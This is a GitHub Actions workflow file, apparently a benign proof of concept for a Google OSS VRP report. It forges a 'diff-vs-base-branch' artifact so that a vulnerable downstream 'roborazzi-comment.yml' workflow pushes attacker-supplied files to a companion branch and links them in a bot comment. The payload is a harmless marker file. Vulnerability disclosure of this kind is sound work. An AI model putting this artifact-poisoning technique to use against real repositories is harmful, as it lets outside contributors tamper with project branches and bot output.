# PoC replacement for .github/workflows/roborazzi-compare-screenshot.yml
# Google OSS VRP — benign proof of concept.
#
# Keeps name "CompareScreenshot" and `on: pull_request` so the vulnerable
# base-branch consumer `roborazzi-comment.yml` still triggers on completion.
# This version does NOT build anything: it forges the `diff-vs-base-branch`
# artifact with a single benign marker file and exits 0.

name: CompareScreenshot

on:
  pull_request:

permissions:
  contents: read

jobs:
  compare-with-base-branch:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    permissions:
      contents: read
      actions: write # upload-artifact
    steps:
      - name: Harden Runner
        uses: step-security/harden-runner@20cf305ff2072d973412fa9b1e3a4f227bda3c76 # v2.14.0
        with:
          egress-policy: audit

      # Forge the poisoned artifact. The file name ends in `_compare.png` and its
      # path contains `roborazzi/`, so the unmodified consumer will (a) treat it
      # as a "valid file", (b) `git add` + `git push -f` it to the
      # `roborazzi_companion_` branch, and (c) link it from the bot PR comment.
      - name: (PoC) Forge poisoned roborazzi diff artifact
        run: |
          set -eux
          mkdir -p out/roborazzi
          printf 'Benign PoC for Google OSS VRP report. Handle: %s. UTC: %s\n' \
            "zzz__" "$(date -u +%FT%TZ)" \
            > out/roborazzi/h1poc_compare.png
          ls -R out

      - name: Upload forged diff artifact
        uses: actions/upload-artifact@bbbca2ddaa5d8feaa63e36b76fdaad77386f024f # v7.0.0
        with:
          name: diff-vs-base-branch
          path: out
          retention-days: 1

      - name: Save PR number
        run: |
          mkdir -p ./pr
          echo "${{ github.event.number }}" > ./pr/NR

      - name: Upload pr artifact
        uses: actions/upload-artifact@bbbca2ddaa5d8feaa63e36b76fdaad77386f024f # v7.0.0
        with:
          name: pr
          path: pr/
          retention-days: 1
